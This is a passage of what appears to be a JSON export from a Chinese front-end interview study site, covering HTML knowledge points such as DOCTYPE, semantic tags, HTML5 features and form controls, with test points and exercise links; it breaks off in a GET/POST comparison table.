{
  "5": {
    "id": 5,
    "tagId": 12,
    "title": "DOCTYPE",
    "explanation": "`DOCTYPE` 是一个声明，位于 HTML 文档的最顶部，指示浏览器使用哪种 HTML 或 XHTML 版本来渲染页面。它的主要作用是确保浏览器以标准模式解析文档，从而避免不同浏览器间的渲染差异。正确使用 DOCTYPE 可以提升页面的兼容性和可访问性。\n\n`<!DOCTYPE>`声明应该位于HTML文档的第一行，紧接着是`<html>`标签。\n\n例如，对于 HTML5 文档，你只需写：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Document Title</title>\n</head>\n<body>\n    <!-- 页面内容 -->\n</body>\n</html>\n```\n\n这个声明告诉浏览器该文档是一个HTML5文档。HTML5是最新的HTML标准，它包括了许多现代化的功能，如语义元素、表单控件、音频和视频等。\n\n* * *\n\n`DOCTYPE` 的作用有以下几个方面：\n\n1.  **指定 HTML 版本**：浏览器根据 DOCTYPE 的声明来确定使用哪个 HTML 版本来渲染页面，从而保证页面在不同的浏览器上显示一致性。\n2.  **触发标准模式**：在 HTML 中，如果省略了 DOCTYPE 声明，浏览器会进入混杂模式（Quirks mode），这种模式下浏览器的渲染方式与早期的浏览器相同，可能导致页面的显示出现不可预测的错误。而指定了 DOCTYPE 声明，则会触发标准模式（Standards mode），使得浏览器按照 HTML 规范的要求进行页面渲染，从而保证页面的稳定性和可靠性。\n3.  **供浏览器和开发人员参考**：DOCTYPE 声明还包含了有关 HTML 文档的元信息，例如所使用的 DTD（文档类型定义），以及其他的元数据信息，这些信息可以供浏览器和开发人员参考，帮助开发人员更好地了解和掌握 HTML 语言的特点和规范。\n4.  **提高网页加载速度**：指定 DOCTYPE 声明可以帮助浏览器更快地加载网页，因为浏览器知道要使用哪种渲染模式，从而更快地解析 HTML 文档。\n5.  **避免代码错误**：指定 DOCTYPE 声明可以帮助开发人员在编写 HTML 代码时遵循标准，避免一些常见的代码错误，例如忘记关闭标签或者使用非法的属性和元素等等。\n\n* * *\n\n除了HTML5的`<!DOCTYPE>`声明之外，还有一些其他版本的HTML和XHTML文档类型声明。这里是一些例子：\n\n**1\\. HTML 4.01 Strict：**\n\n```html\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">\n```\n\n此声明表示该文档遵循HTML 4.01的严格标准，不包括过时的标签和属性。\n\n**2\\. HTML 4.01 Transitional：**\n\n```html\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n```\n\n此声明表示该文档遵循HTML 4.01的过渡标准，允许使用一些过时的标签和属性。\n\n**3\\. HTML 4.01 Frameset：**\n\n```html\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Frameset//EN\" \"http://www.w3.org/TR/html4/frameset.dtd\">\n```\n\n此声明表示该文档遵循HTML 4.01的框架集标准，用于支持旧式的框架布局。\n\n**4\\. XHTML 1.0 Strict：**\n\n```html\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\n```\n\n此声明表示该文档遵循XHTML 1.0的严格标准，不包括过时的标签和属性。\n\n**5\\. XHTML 1.0 Transitional：**\n\n```html\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n```\n\n此声明表示该文档遵循XHTML 1.0的过渡标准，允许使用一些过时的标签和属性。\n\n**6\\. XHTML 1.0 Frameset：**\n\n```html\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Frameset//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd\">\n```\n\n此声明表示该文档遵循XHTML 1.0的框架集标准，用于支持旧式的框架布局。\n\n**7\\. XHTML 1.1：**\n\n```html\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.1//EN\" \"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd\">\n```\n\n此声明表示该文档遵循XHTML 1.1的标准。",
    "testPoint": "1. **定义与作用**：考察你对 DOCTYPE 的基本理解和它的目的。\n2. **不同类型**：询问不同 DOCTYPE 的类型及其适用场景。\n3. **浏览器渲染模式**：了解标准模式与混杂模式的区别，以及 DOCTYPE 如何影响渲染。\n4. **常见错误**：讨论在使用 DOCTYPE 时可能遇到的常见错误及其后果。\n5. **历史背景**：可能涉及 DOCTYPE 的演变及其在不同 HTML 版本中的变化。",
    "exerciseKeyList": "[\"ba6327df-ba59-4870-921c-36b8516c4451\"]",
    "vipLimit": 0,
    "level": 1,
    "pointOrder": 1,
    "createAt": "2024-09-24T12:39:16.000Z",
    "updateAt": "2024-11-06T06:12:18.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "ba6327df-ba59-4870-921c-36b8516c4451",
        "title": "<!DOCTYPE html> 标签有什么用？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T05:54:53.000Z",
        "updateAt": "2024-08-22T04:01:13.000Z"
      }
    ]
  },
  "6": {
    "id": 6,
    "tagId": 12,
    "title": "语义化",
    "explanation": "## HTML 语义化是什么？\n\n-   HTML 语义化是指使用 HTML 标签来正确地表示文档的结构和内容的方式。通过使用正确的标签和元素，可以使网页的结构更加清晰、易于理解，并且对搜索引擎和辅助技术（如屏幕阅读器）更友好。  \n    \n-   CSS 命名的语义化指的是在给 CSS 类名、选择器和 ID 命名时，使用具有语义的名称来描述元素的用途和功能。这样的命名方式可以使代码更具可读性、可维护性和可拓展性。\n\n## 为什么需要语义化？\n\n1.  有利于搜索引擎优化（SEO）：搜索引擎依赖于网页的结构和语义来识别和理解网页内容。使用语义化的 HTML 标签可以提高网页在搜索引擎结果的排名，从而提高页面的 SEO（搜索引擎优化）。\n2.  可读性和可维护性：使用语义化的代码可以增强代码的可读性和可维护性，有利于开发人员理解和维护代码。同时，遵循 W3C 标准的团队可以遵循相同的标准，减少差异化，提高团队的效率和协调能力。\n3.  提高可访问性：语义化可以提高网页的可访问性，让页面更容易被搜索引擎、辅助技术（如屏幕阅读器）解析和理解，让更多的人能访问和理解网页。\n4.  可间接提升网页的性能：在传统的 HTML 代码中，有时候会存在一些重复的标签和属性，导致代码冗余。使用语义化的 HTML 代码，可以减少这种冗余，让代码更加简洁和高效。\n5.  面向未来的 HTML ，浏览器在未来可能提供更丰富的支持。\n\n## 一些常用的语义化标签及使用场景\n\n### 布局相关的语义化标签：\n\n-   `<header>` 标签：用于定义文档或一个节的头部区域。通常包含网页的标题、导航栏、logo 或其他相关信息；作用是为页面提供附加的信息或功能，以帮助用户更好地理解或导航网页内容。适用于表示网页或一个节的顶部区域。\n-   `<aside>` 标签：用于定义与页面内容相关但可以被视为独立于主要内容的部分。它通常用于侧边栏、广告、导航链接、附加信息或其他类似的内容。\n-   `<section>` 标签：用于表页面中的一个独立部分，具有明确的主题或目的。例如文章、评论、产品列表、产品规格及描述等。一个页面可以包含多个不同主题的 section ；并且这个标签可以包含标题、段落、列表、表格等其他HTML元素。\n-   `<nav>` 标签：用于表示导航菜单，包括主导航、子导航、面包屑导航等。这个标签通常包含链接（`<a>` 标签）来指向其他页面或网站的部分。\n-   `<footer>` 标签：用于表示文档的页脚，通常包含版权信息、联系方式、法律声明等内容。它通常出现在页面的底部，并且只应该出现一次。\n-   `<main>` 标签：用于表示页面中的主要内容区域，是所有主要内容（包括头部、尾部和侧边栏）的容器。每个`<main>`元素都应该包含独特的内容，这部分内容在页面上是唯一的，且对整个页面来说是重要的。`<main>`标签不能包含在页面其它区块元素中，通常是`<body>`的子标签，或者是全局`<div>`的子标签。\n-   `<address>` 标签：用于表示联系信息，通常包含地址、电子邮件地址、电话号码等。这个标签通常用于定义页面或其部分内容的作者或拥有者的联系信息。\n\n**举个栗子🌰：**\n\n```xml\n<body>\n  <!-- 页面的头部 -->\n  <header>\n    <h1>欢迎来到我的网站</h1>\n    <p>这是网站的标题，用于展示网站的核心信息。</p>\n  </header>\n  <!-- 导航菜单 -->\n  <nav>\n    <ul>\n      <li><a href=\"#\">首页</a></li>\n      <li><a href=\"#\">关于我们</a></li>\n      <li><a href=\"#\">产品</a></li>\n      <li><a href=\"#\">联系我们</a></li>\n    </ul>\n  </nav>\n  <!-- 主要内容区域 -->\n  <main>\n    <!-- 第一个内容区块 -->\n    <section></section>\n    <!-- 第二个内容区块 -->\n    <section>\n      <aside></aside>\n      <aside></aside>\n    </section>\n  </main>\n  <!-- 联系信息 -->\n  <address>\n    <p><strong>联系信息：</strong></p>\n    <p>电话：(123) 456-7890</p>\n    <p><a href=\"mailto:example@email.com\">example@email.com</a></p>\n  </address>\n  <!-- 页面的底部 -->\n  <footer>\n    &copy; 2023 My Website. All rights reserved. | 设计：北冥有锅\n  </footer>\n</body>\n```\n\n### 文本相关语义化标签：\n\n#### figure 和 figcaption、del 和 ins\n\n-   `<figure>` 标签：用于处理带有某些嵌入式内容的一组图，照片，代码清单等。表示独立的内容单元，它可以包含任何与主内容相关的附加内容，包括但不限于：文本内容、媒体文件、交互式内容等。使用`<figure>`标签时应当注意内容的独立性和相关性，确保它与主内容是相关的，并且不依赖于主内容而存在。\n-   `<figcaption>` 标签：`<figcaption>`标签是`<figure>`元素的一部分，并且它是可选的。它应该包含在`<figure>`标签内部，作为其第一个或最后一个子元素。一个`<figure>`标签中只能有一个`<figcaption>`标签。\n-   `<del> & <ins>` 标签：  \n    `<del>` 用作已删除内容的标签。浏览器通常通过在已删除的文本上打一行删除线来呈现它。  \n    `<ins>` 用于表示HTML文档中新添加的文本。它通常在文本上带有下划线。  \n    `<ins>` 与`<del>` 一起使用时更有用，他们都可以使用CSS属性进行更改。  \n    `<ins>` 与`<del>` 的特定属性：  \n    cite:URL => 它指定资源的URL，该URL解释更改或删除文本的原因。  \n    datetime:YYYYMMDD || HH:MM:SS => 它指定更改或删除文本的日期和时间。\n\n**举个栗子🌰：**\n\n```xml\n<figure>\n  <img src=\"example.jpg\" alt=\"Example Image\">  \n  <figcaption>  \n    <del cite=\"https://example.com/original-source\" datetime=\"2023-06-01\">原始图片描述：这是一张示例图片。</del>  \n    <ins cite=\"https://example.com/updated-source\" datetime=\"2023-06-05\">更新后的图片描述：这是一张示例图片，经过了修改。</ins>  \n  </figcaption>  \n</figure>\n```\n\n#### strong 和 em\n\n-   `<strong>` 标签：表示重要或强调的文本。它用于告诉搜索引擎和辅助技术（如屏幕阅读器）该文本具有重要语义，应当被特别处理。在视觉上可能被加粗，但`<strong>`标签的真正目的是提供语义上的强调，而不是改变文本的外观。\n-   `<em>` 标签：表示强调的文本。它告诉搜索引擎和辅助技术（如屏幕阅读器）该文本具有强调的语义，应当被特别处理。`<em>`标签在视觉上可能被斜体显示，但真正目的是提供语义上的强调，而不是改变文本的外观。\n\n**举个栗子🌰：**\n\n```css\n<article>  \n  <header><strong>文章标题</strong></header>  \n  <section><em>文章内容</em></section>  \n</article>\n```\n\n#### sub 和 sup\n\n-   `<sub>` 标签：用于定义下标文本。 `<sub>`中的文本呈现的基线较低，并且字体比周围的文本字体小。\n-   `<sup>` 标签：用于定义上标文本。 `<sup>`标签中的文本以较高的基线出现，并且字体比周围的文本字体小。\n\n**举个栗子🌰：**\n\n```xml\n<p>H<sub>2</sub>O是水的化学式。</p>\n<p>x<sup>2</sup>表示x的平方。</p> \n```\n\n## 自我思考\n\n#### 1\\. 是不是有了语义化标签我们就再也不使用 `<div>` 标签了？\n\n语义化标签是为了更好地描述网页内容的含义和结构，使搜索引擎和辅助技术能够更好地理解和解析网页。虽然语义化标签可以帮助我们更好地组织和布局网页，但仍然可能需要使用`<div>`标签来创建自定义的结构和样式。  \n`<div>`标签是一个通用的容器标签，可以用于任何目的，包括创建网页布局和组织内容。要合理使用语义化标签和`<div>`标签，并根据具体情况选择最适合的标签来标记网页内容。\n\n#### 2.`<strong>`和`<b>`、以及`<em>`和`<i>`之间的主要区别？\n\n`<strong>` 元素用于表示重要性或强调文本，而 `<b>` 元素仅用于粗体显示。  \n`<em>` 元素用于强调文本，而 `<i>` 元素仅用于斜体显示。  \n`<strong>` 元素和 `<em>` 元素具有更强的语义含义，而 `<b>` 元素和 `<i>` 元素仅用于视觉效果。\n\n#### 3.有可以实现首行缩进的语义化标签吗？\n\n目前HTML中没有专门的语义化标签用于实现文章段落首行缩进。通常，首行缩进是通过CSS样式来实现的。  \n然而，HTML5引入了一些语义化标签，如`<article>`、`<section>`等，这些标签可以用于表示内容的不同部分，并增加可访问性和语义化。虽然这些标签本身不提供首行缩进的功能，但你可以结合CSS样式来实现该效果。\n\n```css\n<article>\n    <p style=\"text-indent: 2em;\">这是第一段文本，首行将被缩进两个字符的宽度。</p>\n    <p style=\"text-indent: 2em;\">这是第二段文本，同样实现了首行缩进。</p>\n</article>\n```",
    "testPoint": "1. **定义和重要性**：\n   - 理解什么是 HTML 语义化，为什么它对网页结构和可读性重要。\n\n2. **语义化标签**：\n   - 列举常用的语义化标签，如 `<header>`、`<nav>`、`<article>`、`<section>`、`<footer>` 等，并解释它们的用途。\n\n3. **SEO 优势**：\n   - 讨论语义化如何影响搜索引擎优化（SEO），提高网页的可索引性和可读性。\n\n4. **可访问性**：\n   - 了解语义化对无障碍设计的影响，如何帮助屏幕阅读器等辅助技术更好地解析页面内容。\n\n5. **与非语义化标签的比较**：\n   - 比较语义化标签与非语义化标签（如 `<div>` 和 `<span>`）的优缺点。\n\n6. **最佳实践**：\n   - 讨论在项目中实现 HTML 语义化的最佳实践，如如何组织结构和内容。\n\n7. **现代前端框架的支持**：\n   - 了解如何在现代前端框架（如 React、Vue）中使用语义化标签。",
    "exerciseKeyList": "[\"a75b1e9d-9359-47b0-8614-1088eee4b085\",\"c1505892-4928-41b4-bbd1-e83be2f53ff2\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 2,
    "createAt": "2024-09-24T12:42:53.000Z",
    "updateAt": "2024-11-06T06:12:23.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "a75b1e9d-9359-47b0-8614-1088eee4b085",
        "title": "什么是 HTML 语义化？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T05:31:29.000Z",
        "updateAt": "2024-07-22T10:10:28.000Z"
      },
      {
        "exerciseKey": "c1505892-4928-41b4-bbd1-e83be2f53ff2",
        "title": "了解语义化版本 SemVer（Semantic Versioning）吗？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T19:00:12.000Z"
      }
    ]
  },
  "7": {
    "id": 7,
    "tagId": 12,
    "title": "HTML 5 新特性",
    "explanation": "## HTML5 新特性\n\n1.  语义标签\n2.  增强型表单\n3.  视频和音频\n4.  Canvas绘图\n5.  SVG绘图\n6.  地理定位\n7.  拖拽API\n8.  WebWorker\n9.  WebStorage\n10.  WebSocket\n\n## 语义标签\n\n语义化标签使得页面的内容结构化，可以使开发者更方便清晰地构建页面的布局\n\n| 标签 | 描述 |\n| --- | --- |\n| `<header>` | 定义了文档的头部区域 |\n| `<footer>` | 定义了文档的尾部区域 |\n| `<nav>` | 定义文档的导航 |\n| `<section>` | 定义文档中的书 |\n| `<acticle>` | 定义页面独立的内容区域 |\n| `<aside>` | 定义页面侧边栏内容 |\n| `<details>` | 定义用户可以看到或隐藏的额外细节 |\n| `<summary>` | 标签包含details元素的标题 |\n| `<dialog>` | 定义对话框 |\n| `<figure>` | 定义自包含内容，如图表 |\n| `<main>` | 定义文档主内容 |\n\n![image.png](https://static.ecool.fun//article/bd3cef42-a63a-4395-93b5-293c7200b808.jpeg)\n\n## 增强型表单\n\nHTML5新增input输入特性，改善更好的输入控制和验证\n\n| 输入类型 | 描述 |\n| --- | --- |\n| color | 主要用于选取颜色 |\n| date | 选取日期 |\n| datetime | 选取日期（UTC时间） |\n| datetime-local | 选取日期（无时区） |\n| month | 选择一个月份 |\n| week | 选择周和年 |\n| time | 选择一个时间 |\n| email | 包含email地址的输入域 |\n| number | 数值的输入域 |\n| url | url地址的输入域 |\n| tel | 定义输入电话号码的字段 |\n| search | 用于搜索域 |\n| range | 一个范围内数字值的输入域 |\n\nHTML5也新增了五个表单元素\n\n| 标签 | 描述 |\n| --- | --- |\n| `<details>` | 用户会在他们输入数据时看到域定义选项的下拉列表 |\n| `<progress>` | 进度条，展示连接/下载进度 |\n| `<meter>` | 刻度值，用于某些计量，例如温度、重量等 |\n| `<keygen>` | 提供一种验证用户的可靠方法，生成一个公钥和私钥 |\n| `<output>` | 用于不同类型的输出，比如计算或脚本输出 |\n\nHTML5新增表单属性\n\n| 属性 | 描述 |\n| --- | --- |\n| placehoder | 输入框默认提示文字 |\n| required | 要求输入的内容是否可为空 |\n| pattern | 描述一个正则表达式验证输入的值 |\n| min/max | 设置元素最小/最大值 |\n| step | 为输入域规定合法的数字间隔 |\n| height/wdith | 用于image类型标签图像高度/宽度 |\n| autofocus | 规定在页面加载时，域自动获得焦点 |\n| multiple | 规定元素中可选择多个值 |\n\n## 视频和音频\n\n-   **音频文件标准**，`<audio>`\n\n```html\n<audio controls>\n  <source src=\"horse.ogg\" type=\"audio/ogg\">\n  <source src=\"horse.mp3\" type=\"audio/mpeg\">\n您的浏览器不支持 audio 元素。\n</audio>\n```\n\n　`control` 属性供添加播放、暂停和音量控件。\n\n　在`<audio>` 与 `</audio>` 之间你需要插入浏览器不支持的`<audio>`元素的提示文本 。\n\n　`<audio>` 元素允许使用多个 `<source>` 元素. `<source>` 元素可以链接不同的音频文件，浏览器将使用第一个支持的音频文件\n\n　目前, 元素支持三种音频格式文件: MP3, Wav, 和 Ogg 　\n\n-   **视频文件标准** `<vedio>`\n\n```html\n<video width=\"320\" height=\"240\" controls>\n  <source src=\"movie.mp4\" type=\"video/mp4\">\n  <source src=\"movie.ogg\" type=\"video/ogg\">\n您的浏览器不支持Video标签。\n</video>\n```\n\n`control` 提供了 播放、暂停和音量控件来控制视频。也可以使用dom操作来控制视频的播放暂停，如 K 方法。\n\n同时 `video` 元素也提供了 `width` 和 `height` 属性控制视频的尺寸.如果设置的高度和宽度，所需的视频空间会在页面加载时保留。如果没有设置这些属性，浏览器不知道大小的视频，浏览器就不能再加载时保留特定的空间，页面就会根据原始视频的大小而改变。\n\n与 标签之间插入的内容是提供给不支持 `video` 元素的浏览器显示的。\n\n`video` 元素支持多个`source` 元素. 元素可以链接不同的视频文件。浏览器将使用第一个可识别的格式（ MP4, WebM, 和 Ogg）\n\n## Canvas绘图\n\nCanvas 是 HTML5 提供的一个用于绘制图形的元素，使用 `<canvas>` 标签创建。通过 JavaScript，你可以在这个画布上进行像素级的绘图，支持2D和3D图形。常见应用包括游戏、动画、图表等。Canvas API 提供了一系列方法，如 `fillRect()`、`drawImage()` 和 `arc()`，使得绘图变得灵活和强大。\n\n## SVG绘图\n\n什么是SVG：\n\n-   SVG指可伸缩矢量图形\n    \n-   SVG用于定义用于网络的基于矢量的图形\n    \n-   SVG使用XML格式定义图形\n    \n-   SVG图像在放大或改变尺寸的情况下其图形质量不会有损失\n    \n-   SVG是万维网联盟的标准\n    \n\nSVG的优势：\n\n-   SVG图像可通过文本编译器来创建和修改\n    \n-   SVG图像可被搜索、索引、脚本化或压缩\n    \n-   SVG是可伸缩的\n    \n-   SVG图像可在任何的分辨率下被高质量的打印\n    \n-   SVG可在图像质量不下降的情况下被放大\n    \n\nSVG与Canvas的区别：\n\n-   SVG适用于描述XML中的2D图形的语言\n    \n-   Canvas随时随地绘制2D图形（使用javaScript）\n    \n-   SVG是基于XML的，意味这可以操作DOM，渲染速度较慢\n    \n-   在SVG中每个形状都被当做是一个对象，如果SVG发生改变，页面就会发生重绘\n    \n-   Canvas是一像素一像素地渲染，如果改变某一个位置，整个画布会重绘。\n    \n\n| Canvas | SVG |\n| --- | --- |\n| 依赖分辨率 | 不依赖分辨率 |\n| 不支持事件处理器 | 支持事件处理器 |\n| 能够以.png或.jpg格式保存结果图像 | 复杂度会减慢搞渲染速度 |\n| 文字呈现功能比较简单 | 适合大型渲染区域的应用程序 |\n| 最合适图像密集的游戏 | 不适合游戏应用 |\n\n## 地理定位 Geolocation\n\nHTML5新增了Geolocation 用于定位用户的位置\n\n```javascript\nwindow.navigator.geolocation {\n    getCurrentPosition:  fn   用于获取当前的位置数据\n    watchPosition: fn  监视用户位置的改变\n    clearWatch: fn   清除定位监视\n}　\n```\n\n获取用户定位信息\n\n```javascript\nnavigator.geolocation.getCurrentPosition(\n    function(pos){\n　　　　console.log('用户定位数据获取成功')\n　　　　//console.log(arguments);\n　　　　console.log('定位时间：',pos.timestamp)\n　　　　console.log('经度：',pos.coords.longitude)\n　　　　console.log('纬度：',pos.coords.latitude)\n　　　　console.log('海拔：',pos.coords.altitude)\n　　　　console.log('速度：',pos.coords.speed)\n\n},    //定位成功的回调\n\n\nfunction(err){ \n　　　　console.log('用户定位数据获取失败')\n　　　　//console.log(arguments);\n\n}        //定位失败的回调\n)\n```\n\n## 拖放API\n\n拖放是一种常见的特性，即捉取对象后拖到另一个位置\n\n```html\n<div draggable=\"true\"></div>\n```\n\n当元素拖动时，我们可以检查其拖动的数据。\n\n```html\n<div draggable=\"true\" ondragstart=\"drag(event)\"></div>\n<script>\nfunction drag(ev){\n    console.log(ev);\n}\n</script>\n```\n\n| 拖动生命周期 | 属性名 | 描述 |\n| --- | --- | --- |\n| 拖动开始 | ondragstart | 在拖动操作开始时执行脚本 |\n| 拖动过程中 | ondrag | 只要脚本在被拖动就运行脚本 |\n| 拖动过程中 | ondragenter | 当元素被拖动到一个合法的防止目标时，执行脚本 |\n| 拖动过程中 | ondragover | 只要元素正在合法的防止目标上拖动时，就执行脚本 |\n| 拖动过程中 | ondragleave | 当元素离开合法的防止目标时 |\n| 拖动结束 | ondrop | 将被拖动元素放在目标元素内时运行脚本 |\n| 拖动结束 | ondragend | 在拖动操作结束时运行脚本 |\n\n## WebWorker\n\nWeb Worker可以通过加载一个脚本文件，进而创建一个独立工作的线程，在主线程之外运行。\n\nWeb Worker的基本原理就是在当前javascript的主线程中，使用Worker类加载一个javascript文件来开辟一个新的线程，\n\n起到互不阻塞执行的效果，并且提供主线程和新县城之间数据交换的接口：postMessage、onmessage。\n\nJS\n\n```javascript\n//worker.js\nonmessage =function (evt){\n  var d = evt.data;//通过evt.data获得发送来的数据\n  postMessage( d );//将获取到的数据发送会主线程\n}\n```\n\nhtml\n\n```javascript\n<!DOCTYPE HTML>\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>\n<script type=\"text/javascript\">\n//WEB页主线程\nvar worker =new Worker(\"worker.js\"); //创建一个Worker对象并向它传递将在新线程中执行的脚本的URL\nworker.postMessage(\"hello world\");     //向worker发送数据\nworker.onmessage =function(evt){     //接收worker传过来的数据函数\n   console.log(evt.data);              //输出worker发送来的数据\n}\n</script>\n</head>\n<body></body>\n</html>\n```\n\n## WebStorage\n\n使用HTML5可以在本地存储用户的浏览数据。早些时候,本地存储使用的是cookies。但是Web 存储需要更加的安全与快速. 这些数据不会被保存在服务器上，但是这些数据只用于用户请求网站数据上.它也可以存储大量的数据，而不影响网站的性能。数据以 键/值 对存在, web网页的数据只允许该网页访问使用。\n\n**websorage拥有5M的存储容量，而cookie却只有4K**，这是完全不能比的。\n\n客户端存储数据的两个对象为：\n\n-   localStorage - 没有时间限制的数据存储\n-   sessionStorage - 针对一个 session 的数据存储, 当用户关闭浏览器窗口后，数据会被删除。\n\nAPI(以localStorage为例)：\n\n-   保存数据：localStorage.setItem(key,value);\n-   读取数据：localStorage.getItem(key);\n-   删除单个数据：localStorage.removeItem(key);\n-   删除所有数据：localStorage.clear();\n-   得到某个索引的key：localStorage.key(index);\n\n## WebSocket\n\nWebSocket协议为web应用程序客户端和服务端之间提供了一种全双工通信机制。\n\n特点：\n\n-   握手阶段采用HTTP协议，默认端口是80和443\n    \n-   建立在TCP协议基础之上，和http协议同属于应用层\n    \n-   可以发送文本，也可以发送二进制数据。\n    \n-   没有同源限制，客户端可以与任意服务器通信。\n    \n-   协议标识符是ws（如果加密，为wss），如ws://localhost:8023\n",
    "testPoint": "1. **新语义化元素**：\n   - 了解新引入的语义化标签，如 `<article>`、`<section>`、`<header>`、`<footer>`、`<nav>` 等。\n\n2. **多媒体支持**：\n   - 讨论 `<audio>` 和 `<video>` 标签的使用及其属性，如何在页面中嵌入音频和视频。\n\n3. **表单控件**：\n   - 了解新表单元素和属性，如 `<input>` 类型（如 date、email、range）以及新特性（如 placeholder、required、autofocus）。\n\n4. **Canvas 和 SVG**：\n   - 掌握 `<canvas>` 元素的基本用法，以及如何使用它绘制图形和动画。\n\n5. **Web Storage**：\n   - 理解 LocalStorage 和 SessionStorage 的概念及其用法，如何在客户端存储数据。\n\n6. **离线存储**：\n   - 讨论应用缓存（AppCache）和离线网页的实现，以及其优势。\n\n7. **WebSockets**：\n   - 了解 WebSockets 的概念及其在实时通信中的应用。\n\n8. **新API**：\n   - 熟悉新引入的 API，如 Geolocation API、Drag and Drop API、Web Workers 等。",
    "exerciseKeyList": "[\"969cddcd-b1ac-4285-86f6-ae0a8eaf828a\",\"d2d8725c-7941-4ba8-9b92-67a730fa1097\",\"93ffefee-3471-48a5-b60c-1b7adf8edf13\",\"63d73ae0-ea78-4b4c-8a85-6be7513a62a4\",\"362a44f0-8be1-4e5b-abfc-f3ddadc4aa2e\"]",
    "vipLimit": 0,
    "level": 3,
    "pointOrder": 0,
    "createAt": "2024-09-24T12:50:28.000Z",
    "updateAt": "2024-11-06T06:12:18.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "362a44f0-8be1-4e5b-abfc-f3ddadc4aa2e",
        "title": "HTML5 有哪些新特性？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T05:55:52.000Z",
        "updateAt": "2021-07-04T16:01:47.000Z"
      },
      {
        "exerciseKey": "63d73ae0-ea78-4b4c-8a85-6be7513a62a4",
        "title": "什么是HTML5，以及和HTML的区别是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T07:37:18.000Z",
        "updateAt": "2024-07-22T10:09:27.000Z"
      },
      {
        "exerciseKey": "93ffefee-3471-48a5-b60c-1b7adf8edf13",
        "title": "浏览器是如何对 HTML5 的离线储存资源进行管理和加载？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-06-25T06:31:31.000Z",
        "updateAt": "2024-07-22T10:07:14.000Z"
      },
      {
        "exerciseKey": "969cddcd-b1ac-4285-86f6-ae0a8eaf828a",
        "title": "HTML5 有哪些 drag 相关的 API ？\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-06-25T06:34:57.000Z",
        "updateAt": "2024-08-22T01:32:17.000Z"
      },
      {
        "exerciseKey": "d2d8725c-7941-4ba8-9b92-67a730fa1097",
        "title": "HTML5的离线储存怎么使用，它的工作原理是什么",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2022-06-25T06:31:05.000Z",
        "updateAt": "2024-07-22T10:07:26.000Z"
      }
    ]
  },
  "8": {
    "id": 8,
    "tagId": 12,
    "title": "表单控件",
    "explanation": "## 01、`<form>`表单\n\n表单是比较重要的HTML元素，主要作用是向服务端提交数据。比如结合表单元素`input`使用，通过内部的`button`按钮提交（type=\"submit\"）表单数据。\n\n| **元素/属性** | **描述** | **值/备注** |\n| --- | --- | --- |\n| `<form>` | 表单元素 |  |\n|  **action** | 提交表单的目标（服务端）地址url |  |\n|  **method** | 提交数据的方式，就是数据传输的方式 | **get**：通过URL提交数据 `url?uname=1&age=2`；**post**，通过HTTP表单数据提交，键值格式。|\n|  **target** | 提交数据时打开action url的方式 | **\\_self**：当前窗口（默认值）；**\\_blank**：新窗口 |\n|  enctype | 编码类型（encode type），规定了form表单在发送到服务器时候编码方式，不常用。 | **application/x-www-form-urlencoded**：编码所有字符（默认）；**multipart/form-data** ：混合类型， 表单中有文件上传时使用；**text/plain**：纯文体，空格转换为 “+” 加号，不对特殊字符编码|\n| submit() | 提交表单数据，通过js代码调用 |  |\n| `<fieldset>` | 表单分组，默认样式：一个框 | 便于表单样式管理的语义化元素 |\n|  form | from的id，当`<fieldset>`不在form中时 |  |\n|  disabled | 整个分组都不可用 |   |\n| `<legend>` | 作为`<fieldset>`的标题，显示在框上 | （legend /ˈledʒənd/ 铭文、图例） |\n\n```html\n<style>\n    #form fieldset {\n        border: 1px solid skyblue;\n        padding: 20px 10px;\n        border-radius: 5px;\n        text-align: center;\n        margin: 10px 0px;\n    }\n    #form fieldset legend {\n        font-size: 1em;\n        border: 1px solid rgb(236, 175, 43);\n        border-radius: 1em;\n        padding: 3px 15px;\n    }\n</style>\n<form id=\"form\" action=\"#\" target=\"_self\" method=\"post\">\n    <fieldset>\n        <legend>登录</legend>\n        <input type=\"text\" name=\"uname\" placeholder=\"请输入用户名\" required maxlength=\"36\">\n        <input type=\"password\" name=\"upwd\" required maxlength=\"12\" placeholder=\"输入密码\">\n        <input type=\"submit\" value=\"submit-登录\">\n    </fieldset>\n</form>\n```\n\n> **📢注意：**`<form>`提交数据时参数名为表单元素的name，因此表单控件须设置name属性。\n\n### ❓get、post区别：\n\n|    | **GET** | **POST** |\n| --- | --- | --- |\n| **提交方式** | 数据在url的问号`?`后：`url?key=value&key=...` | 数据在请求体中 |\n| **编码**enctype | 只有appliacation-x-www-form-urlencoded | 支持多种 |\n| **书签/历史** | 可以加入收藏，历史记录、日志会保留数据 | 不可收藏、不会保留数据 |\n| **缓存/效率** | 